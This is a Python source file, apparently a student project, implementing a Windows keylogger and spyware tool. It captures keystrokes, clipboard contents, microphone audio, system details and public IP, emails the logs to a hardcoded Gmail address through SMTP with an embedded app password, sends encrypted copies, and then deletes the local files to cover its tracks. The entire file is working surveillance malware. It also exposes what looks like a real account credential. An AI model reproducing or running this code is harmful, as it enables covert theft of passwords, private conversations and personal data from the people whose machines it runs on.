# Libraries

# for emails
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# to connect to PC
import socket
import platform

# for clipboard
import win32clipboard

# to grab keystrokes
from pynput.keyboard import Key, Listener

# to track time
import time
import os

# for microphone
from scipy.io.wavfile import write
import sounddevice as sd

# to encrypt files
from cryptography.fernet import Fernet

# to get username and requests
import getpass
from requests import get

# for screenshots
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_info = "system.txt"
clipboard = "clipboard.txt"
audio_info = "audio.wav"
screen = "screenshot.png"
microphone_time = 10
file_path = "D:\\VIT 20-21\\SEM-6\\CS\\CP\\MainProject"  # Enter the file path you want your files to be saved to
extend = "\\"
final_path = file_path + extend

no_of_iteration = 0
time_it = 5
no_of_iteration_end = 3

keys_info_e = "key_log_e.txt"
sys_info_e = "sys_info_e.txt"
clip_e = "clip_e.txt"

key1 = Fernet.generate_key()
file = open("encryption_key.txt", "wb")
file.write(key1)
file.close()
username = getpass.getuser()


# to get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(final_path + screen)
    print("----------Screenshot taken-----------\n")

# to get data from clipboard or doc file
def copy_clip():
    with open(final_path + clipboard, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_info = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("CLipboard data : \n" + pasted_info)
            print("----------Clipboard Copied-----------\n")

        except:
            f.write("Clipboard couldn't be copied")


# to collect content of microphone
def microphone():
    fs = 44100  # sampling frequency
    sec = microphone_time
    myrecord = sd.rec(int(sec * fs), samplerate=fs, channels=2)
    sd.wait()

    write(final_path + audio_info, fs, myrecord)
    print("----------Audio Recorded-----------\n")


# To get our computer Info
def computer_info():
    with open(final_path + system_info, "a") as f:
        host = socket.gethostname()
        IPaddr = socket.gethostbyname(host)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address " + public_ip)

        except Exception:
            f.write("Couldn't get public IP address ( most likely max query)")
        f.write("Processor : " + (platform.processor()) + '\n')
        f.write("System : " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine : " + platform.machine() + "\n")
        f.write("Hostname : " + host + "\n")
        f.write("Private IP Addr : " + IPaddr + "\n")
        print("----------System Info Copied-----------\n")


email_addr = "shru.p0411@gmail.com"

password = "qsnfwbrkgfmsclbb"
toaddr = "shru.p0411@gmail.com"


# send email of the keylog file
def send_email(filename, attachment, toaddr ,body):
    fromaddr = email_addr

    msg = MIMEMultipart()  # supports emails attachments
    msg['From'] = fromaddr  # storing the senders email address
    msg['To'] = toaddr  # storing the receivers email address
    msg['Subject'] = "Log File"  # storing the subject
    body = body  # string to store the body of the mail
    msg.attach(MIMEText(body, 'plain'))  # attach the body with the msg instance

    filename = filename  # open the file to be sent
    attachment = open(attachment, "rb")  # read the attachments

    p = MIMEBase('application', 'octet-stream')  # instance of MIMEBase and named as p

    p.set_payload(attachment.read())  # to encode the msg
    encoders.encode_base64(p)  # finish encoding by coating it with base64

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)  # attach  'p' to  'msg'

    s = smtplib.SMTP('smtp.gmail.com', 587)  # creates SMTP session
    s.starttls()  # start TLS for security
    s.login(fromaddr, password)  # Authentication
    text = msg.as_string()  # Converts the Multipart msg into a string
    s.sendmail(fromaddr, toaddr, text)  # sending the mail
    s.quit()  # terminating the session
    print("----------"+body+" Mail Sent-----------\n")


count = 0
keys = []


# get the key details that are pressed
def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1


    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


# log the key into a file
def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


# for exit
def on_release(key):
    if key == Key.esc:
        return False



with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# function calls
microphone()
computer_info()
copy_clip()
send_email(keys_information, final_path+keys_information, toaddr,keys_information)
send_email(clipboard, file_path + extend + clipboard, toaddr,clipboard)


send_email(audio_info, file_path + extend + audio_info, toaddr,audio_info)
send_email(system_info, final_path + extend + system_info, toaddr,system_info)
# to encrypt the file
files_encrypt = [final_path + system_info, final_path + clipboard, final_path + keys_information]
encrypted = [sys_info_e, clip_e, keys_info_e]
i = 0

for ef in files_encrypt:
    with open(files_encrypt[i], 'rb') as f:
        data = f.read()
    fernet = Fernet(key1)
    encrypt_data = fernet.encrypt(data)

    with open(encrypted[i], "wb") as f:
        f.write(encrypt_data)

    send_email(encrypted[i],final_path +  encrypted[i], toaddr,encrypted[i])
    i += 1

time.sleep(120)
# Clean up our tracks and delete files
delete_files = [system_info, clipboard, keys_information, audio_info]
for file in delete_files:
    os.remove(final_path + file)
print("----------All Data Cleaned-----------\n")


